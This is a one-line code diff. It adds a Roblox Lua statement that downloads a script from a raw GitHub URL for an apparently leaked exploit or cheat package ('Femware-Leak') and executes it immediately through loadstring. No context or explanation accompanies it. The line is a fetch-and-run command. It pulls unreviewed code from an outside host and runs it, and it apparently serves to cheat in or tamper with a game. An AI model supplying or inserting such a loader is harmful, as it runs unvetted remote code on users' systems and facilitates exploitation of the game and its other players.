@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NougatBitz/Femware-Leak/main/CleanedVersion.lua"))()
